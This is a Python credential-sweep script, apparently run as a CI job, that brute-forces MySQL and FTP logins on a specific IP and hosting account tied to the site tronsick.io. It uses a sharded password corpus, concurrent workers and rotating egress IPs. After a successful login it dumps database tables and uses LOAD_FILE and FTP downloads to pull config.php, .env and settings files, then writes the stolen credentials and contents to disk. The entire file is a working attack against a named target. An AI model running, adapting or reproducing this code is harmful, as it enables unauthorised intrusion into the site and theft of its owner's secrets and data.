#!/usr/bin/env python3
# tronsick legacy-origin DB/FTP credential sweep (fresh-egress runner)
import os, sys, time, socket, threading, queue, ftplib, json, base64, subprocess

TARGET = os.environ.get("TARGET", "153.92.11.34")
MODE   = os.environ.get("MODE", "mysql")           # mysql|ftp|both|probe
SHARD  = int(os.environ.get("SHARD", "0"))
SHARDS = int(os.environ.get("SHARDS", "1"))
CONC   = int(os.environ.get("CONC", "24"))
CORPUS = os.environ.get("CORPUS", "attack/corpus.txt")
DB_USERS = [u for u in os.environ.get(
    "DB_USERS",
    "u895912460,u895912460_tronsick,u895912460_tronsick_db,u895912460_tronsick_db_,u895912460_root,root,admin,tronsick,mysql,db"
).split(",") if u]
FTP_USER = os.environ.get("FTP_USER", "u895912460")
HITDIR = os.environ.get("HITDIR", "hits")
os.makedirs(HITDIR, exist_ok=True)


def load_corpus():
    pw = []
    with open(CORPUS, "r", errors="ignore") as f:
        for line in f:
            s = line.rstrip("\n")
            if s:
                pw.append(s)
    seen = set()
    out = []
    for p in pw:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return [p for i, p in enumerate(out) if i % SHARDS == SHARD]


def egress_ip():
    for url in ("https://ifconfig.me", "https://api.ipify.org", "https://icanhazip.com"):
        try:
            r = subprocess.run(["curl", "-s", "-4", "-m", "15", url],
                               capture_output=True, text=True, timeout=25)
            if r.stdout.strip():
                return r.stdout.strip()
        except Exception:
            pass
    return "?"


def probe():
    print("EGRESS_IP", egress_ip(), flush=True)
    for p in (21, 80, 443, 3306):
        try:
            s = socket.create_connection((TARGET, p), timeout=8)
            s.close()
            print(f"PORT {p} OPEN", flush=True)
        except Exception as e:
            print(f"PORT {p} closed/filtered {e}", flush=True)
    try:
        s = socket.create_connection((TARGET, 21), timeout=20)
        s.settimeout(20)
        print("FTP BANNER", s.recv(200), flush=True)
        s.close()
    except Exception as e:
        print("FTP banner failed:", e, flush=True)
    try:
        import pymysql
        c = pymysql.connect(host=TARGET, port=3306, user="baduser", password="badpass",
                            connect_timeout=15)
        c.close()
    except Exception as e:
        print("MYSQL baduser ->", str(e)[:150], flush=True)


def mysql_connect(user, pw, timeout=12):
    import pymysql
    return pymysql.connect(host=TARGET, port=3306, user=user, password=pw,
                           connect_timeout=timeout, read_timeout=timeout,
                           write_timeout=timeout, charset="utf8mb4")


SETTINGS_PATHS = [
    "/domains/tronsick.io/public_html/data/site_settings.json",
    "/home/u895912460/domains/tronsick.io/public_html/data/site_settings.json",
    "/home/u895912460/public_html/data/site_settings.json",
    "/var/www/html/data/site_settings.json",
    "/domains/tronsick.io/public_html/config.php",
    "/domains/tronsick.io/public_html/api/config.php",
    "/domains/tronsick.io/public_html/api/db.php",
    "/domains/tronsick.io/public_html/.env",
]


def dump_mysql(user, pw):
    print(f"!!! MYSQL HIT user={user!r} pass={pw!r} egress={egress_ip()}", flush=True)
    res = {"kind": "mysql", "user": user, "password": pw}
    try:
        conn = mysql_connect(user, pw)
        cur = conn.cursor()
        def q(sql):
            try:
                cur.execute(sql)
                return cur.fetchall()
            except Exception as e:
                return f"ERR {e}"
        print("VERSION", q("SELECT VERSION()"), flush=True)
        print("CURRENT_USER", q("SELECT CURRENT_USER(), USER()"), flush=True)
        dbs = q("SHOW DATABASES")
        print("DATABASES", dbs, flush=True)
        res["version"] = str(q("SELECT VERSION()"))
        for db in ("u895912460_tronsick_db",):
            try:
                conn.select_db(db)
                tbls = q("SHOW TABLES")
                print("TABLES", tbls, flush=True)
                res.setdefault("tables", {})
                for row in (tbls if isinstance(tbls, list) else []):
                    t = row[0]
                    d = q(f"SELECT * FROM `{t}` LIMIT 50")
                    print(f"TABLE {t}", d, flush=True)
                    res["tables"][t] = str(d)
            except Exception as e:
                print("DB err", db, e, flush=True)
        for path in SETTINGS_PATHS:
            v = q(f"SELECT LOAD_FILE('{path}')")
            print("LOAD_FILE", path, "=>", v, flush=True)
            res.setdefault("load_file", {})[path] = str(v)
        # write a SQL dump via SELECT INTO OUTFILE if permitted (optional)
        conn.close()
    except Exception as e:
        print("dump err", e, flush=True)
        res["error"] = str(e)
    with open(os.path.join(HITDIR, f"mysql_hit_{SHARD}.json"), "w") as f:
        json.dump(res, f, indent=2)
    print(f"::warning::MYSQL_HIT user={user} pass={pw}", flush=True)


def mysql_worker(q, found):
    while not found["hit"]:
        try:
            pw = q.get_nowait()
        except queue.Empty:
            return
        for u in DB_USERS:
            if found["hit"]:
                return
            try:
                c = mysql_connect(u, pw)
                found["hit"] = (u, pw)
                try:
                    c.close()
                except Exception:
                    pass
                dump_mysql(u, pw)
                return
            except Exception as e:
                msg = str(e)
                if "1045" not in msg and "Access denied" not in msg:
                    print(f"  ERR [{u}:{pw}] {msg[:150]}", flush=True)


def run_mysql():
    corpus = load_corpus()
    print(f"MYSQL SHARD {SHARD}/{SHARDS} candidates={len(corpus)} users={len(DB_USERS)} conc={CONC} egress={egress_ip()}", flush=True)
    q = queue.Queue()
    for pw in corpus:
        q.put(pw)
    found = {"hit": None}
    th = [threading.Thread(target=mysql_worker, args=(q, found), daemon=True) for _ in range(CONC)]
    [t.start() for t in th]
    last = time.time()
    while any(t.is_alive() for t in th):
        time.sleep(1)
        if time.time() - last > 30:
            print(f"  progress remaining={q.qsize()}", flush=True)
            last = time.time()
    if not found["hit"]:
        print(f"NO MYSQL HIT shard {SHARD}", flush=True)


def ftp_try(user, pw):
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET, 21, timeout=22)
        ftp.login(user, pw)
        return ftp
    except Exception:
        return None


def ftp_dump(ftp, user, pw):
    print(f"!!! FTP HIT user={user!r} pass={pw!r} egress={egress_ip()}", flush=True)
    res = {"kind": "ftp", "user": user, "password": pw}
    try:
        res["pwd"] = ftp.pwd()
        for d in ("/", "/domains", "/domains/tronsick.io", "/domains/tronsick.io/public_html",
                  "/domains/tronsick.io/public_html/data", "/public_html", "/data"):
            try:
                res.setdefault("listings", {})[d] = ftp.nlst(d)[:100]
                print("LIST", d, res["listings"][d], flush=True)
            except Exception as e:
                print("Listerr", d, str(e)[:100], flush=True)
        files = SETTINGS_PATHS + [
            "/domains/tronsick.io/public_html/data/site_settings.json",
            "/domains/tronsick.io/public_html/config.php",
            "/domains/tronsick.io/public_html/api/config.php",
            "/domains/tronsick.io/public_html/data/admin_settings.json",
            "/domains/tronsick.io/public_html/README.md",
            "/domains/tronsick.io/public_html/.env",
        ]
        for p in dict.fromkeys(files):
            try:
                buf = []
                ftp.retrlines(f"RETR {p}", buf.append)
                txt = "\n".join(buf)
                print("FILE", p, "=>", txt[:3000], flush=True)
                res.setdefault("files", {})[p] = txt[:10000]
            except Exception as e:
                print("Filerr", p, str(e)[:100], flush=True)
    except Exception as e:
        print("ftp_dump err", e, flush=True)
        res["error"] = str(e)
    with open(os.path.join(HITDIR, f"ftp_hit_{SHARD}.json"), "w") as f:
        json.dump(res, f, indent=2)
    print(f"::warning::FTP_HIT user={user} pass={pw}", flush=True)


def ftp_worker(q, found):
    while not found["hit"]:
        try:
            pw = q.get_nowait()
        except queue.Empty:
            return
        ftp = ftp_try(FTP_USER, pw)
        if ftp:
            found["hit"] = (FTP_USER, pw)
            ftp_dump(ftp, FTP_USER, pw)
            try:
                ftp.quit()
            except Exception:
                pass
            return


def run_ftp():
    corpus = load_corpus()
    print(f"FTP SHARD {SHARD}/{SHARDS} candidates={len(corpus)} user={FTP_USER} conc={CONC} egress={egress_ip()}", flush=True)
    q = queue.Queue()
    for pw in corpus:
        q.put(pw)
    found = {"hit": None}
    th = [threading.Thread(target=ftp_worker, args=(q, found), daemon=True) for _ in range(CONC)]
    [t.start() for t in th]
    while any(t.is_alive() for t in th):
        time.sleep(1)
    if not found["hit"]:
        print(f"NO FTP HIT shard {SHARD}", flush=True)


if __name__ == "__main__":
    if MODE == "probe":
        probe()
    elif MODE == "mysql":
        run_mysql()
    elif MODE == "ftp":
        run_ftp()
    elif MODE == "both":
        t1 = threading.Thread(target=run_mysql)
        t1.start()
        run_ftp()
        t1.join()
    else:
        print("unknown mode", MODE)
